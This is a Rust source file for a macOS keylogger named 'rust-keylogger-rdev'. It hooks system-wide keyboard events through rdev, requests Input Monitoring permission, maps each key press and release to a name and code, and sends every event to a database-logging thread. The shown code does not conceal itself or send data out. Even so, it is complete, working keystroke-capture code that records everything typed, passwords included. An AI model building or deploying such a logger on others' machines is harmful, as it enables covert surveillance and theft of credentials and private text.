use std::error::Error;
use std::fs::{File, OpenOptions};
use std::os::unix::io::AsRawFd;
use std::sync::mpsc;
use rdev::{listen, Event, EventType, Key};

mod db;
mod events;

use events::KeyEvent;

fn acquire_lock() -> Result<File, Box<dyn Error>> {
    let lock_path = format!("{}/rust-keylogger-rdev.lock", std::env::temp_dir().display());
    let file = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(&lock_path)?;
    let fd = file.as_raw_fd();
    let res = unsafe { libc::flock(fd, libc::LOCK_EX | libc::LOCK_NB) };
    if res != 0 {
        eprintln!("[rust-keylogger-rdev] BŁĄD: Inna instancja keyloggera już działa! Blokada pliku aktywna.");
        std::process::exit(1);
    }
    Ok(file)
}

fn map_key(key: Key) -> (String, u32) {
    match key {
        Key::KeyA => ("a".into(), 0),
        Key::KeyB => ("b".into(), 11),
        Key::KeyC => ("c".into(), 8),
        Key::KeyD => ("d".into(), 2),
        Key::KeyE => ("e".into(), 14),
        Key::KeyF => ("f".into(), 3),
        Key::KeyG => ("g".into(), 5),
        Key::KeyH => ("h".into(), 4),
        Key::KeyI => ("i".into(), 34),
        Key::KeyJ => ("j".into(), 38),
        Key::KeyK => ("k".into(), 40),
        Key::KeyL => ("l".into(), 37),
        Key::KeyM => ("m".into(), 46),
        Key::KeyN => ("n".into(), 45),
        Key::KeyO => ("o".into(), 31),
        Key::KeyP => ("p".into(), 35),
        Key::KeyQ => ("q".into(), 12),
        Key::KeyR => ("r".into(), 15),
        Key::KeyS => ("s".into(), 1),
        Key::KeyT => ("t".into(), 17),
        Key::KeyU => ("u".into(), 32),
        Key::KeyV => ("v".into(), 9),
        Key::KeyW => ("w".into(), 13),
        Key::KeyX => ("x".into(), 7),
        Key::KeyY => ("y".into(), 16),
        Key::KeyZ => ("z".into(), 6),

        Key::Num0 => ("0".into(), 29),
        Key::Num1 => ("1".into(), 18),
        Key::Num2 => ("2".into(), 19),
        Key::Num3 => ("3".into(), 20),
        Key::Num4 => ("4".into(), 21),
        Key::Num5 => ("5".into(), 23),
        Key::Num6 => ("6".into(), 22),
        Key::Num7 => ("7".into(), 26),
        Key::Num8 => ("8".into(), 28),
        Key::Num9 => ("9".into(), 25),

        Key::Return => ("Return".into(), 36),
        Key::Space => ("space".into(), 49),
        Key::Backspace => ("BackSpace".into(), 51),
        Key::Tab => ("Tab".into(), 48),
        Key::Escape => ("Escape".into(), 53),

        Key::ShiftLeft => ("Shift_L".into(), 56),
        Key::ShiftRight => ("Shift_R".into(), 60),
        Key::ControlLeft => ("Control_L".into(), 59),
        Key::ControlRight => ("Control_R".into(), 62),
        Key::Alt => ("Alt_L".into(), 58),
        Key::AltGr => ("Alt_R".into(), 61),
        Key::MetaLeft => ("Super_L".into(), 55),
        Key::MetaRight => ("Super_R".into(), 54),
        Key::CapsLock => ("Caps_Lock".into(), 57),

        Key::UpArrow => ("Up".into(), 126),
        Key::DownArrow => ("Down".into(), 125),
        Key::LeftArrow => ("Left".into(), 123),
        Key::RightArrow => ("Right".into(), 124),

        Key::Delete => ("Delete".into(), 117),
        Key::Home => ("Home".into(), 115),
        Key::End => ("End".into(), 119),
        Key::PageUp => ("Page_Up".into(), 116),
        Key::PageDown => ("Page_Down".into(), 121),

        Key::Minus => ("minus".into(), 27),
        Key::Equal => ("equal".into(), 24),
        Key::LeftBracket => ("bracketleft".into(), 33),
        Key::RightBracket => ("bracketright".into(), 30),
        Key::SemiColon => ("semicolon".into(), 41),
        Key::Quote => ("apostrophe".into(), 39),
        Key::BackQuote => ("grave".into(), 50),
        Key::BackSlash => ("backslash".into(), 42),
        Key::Comma => ("comma".into(), 43),
        Key::Dot => ("period".into(), 47),
        Key::Slash => ("slash".into(), 44),

        Key::F1 => ("F1".into(), 122),
        Key::F2 => ("F2".into(), 120),
        Key::F3 => ("F3".into(), 99),
        Key::F4 => ("F4".into(), 118),
        Key::F5 => ("F5".into(), 96),
        Key::F6 => ("F6".into(), 97),
        Key::F7 => ("F7".into(), 98),
        Key::F8 => ("F8".into(), 100),
        Key::F9 => ("F9".into(), 101),
        Key::F10 => ("F10".into(), 109),
        Key::F11 => ("F11".into(), 103),
        Key::F12 => ("F12".into(), 111),

        Key::Unknown(code) => (format!("Unknown_{}", code), code as u32),
        _ => (format!("{:?}", key), 0),
    }
}

unsafe extern "C" {
    fn CGPreflightListenEventAccess() -> bool;
    fn CGRequestListenEventAccess() -> bool;
}

fn main() -> Result<(), Box<dyn Error>> {
    let _lock = acquire_lock()?;

    println!("[*] Starting rust-keylogger-rdev on macOS (CGEventTap via rdev)");

    let has_access = unsafe { CGPreflightListenEventAccess() };
    println!("[*] macOS Input Monitoring permission status (CGPreflightListenEventAccess): {}", has_access);

    if !has_access {
        eprintln!("[!] UWAGA: Proces nie posiada uprawnień do monitorowania klawiatury!");
        eprintln!("[!] Wywołuję systemowe żądanie uprawnień (CGRequestListenEventAccess)...");
        let requested = unsafe { CGRequestListenEventAccess() };
        eprintln!("[*] CGRequestListenEventAccess prompt triggered: {}", requested);
    }

    let (tx, rx) = mpsc::channel::<KeyEvent>();

    db::start_db_thread(rx);

    let callback = move |event: Event| {
        let (event_type, key) = match event.event_type {
            EventType::KeyPress(k) => ("PRESS", k),
            EventType::KeyRelease(k) => ("RELEASE", k),
            _ => return,
        };

        let (key_name, keycode) = map_key(key);
        eprintln!("[DEBUG-TAP] {} {} (code={})", event_type, key_name, keycode);

        let key_event = KeyEvent {
            event_type,
            key_name,
            keycode,
            timestamp: event.time,
        };

        let _ = tx.send(key_event);
    };

    if let Err(error) = listen(callback) {
        eprintln!("[!] rdev listen error: {:?}", error);
        eprintln!("[!] UWAGA: Upewnij się, że proces posiada uprawnienia w:");
        eprintln!("    Ustawienia systemowe -> Prywatność i ochrona -> Monitorowanie wprowadzania (Input Monitoring) oraz Dostępność (Accessibility)");
        return Err(format!("{:?}", error).into());
    }

    Ok(())
}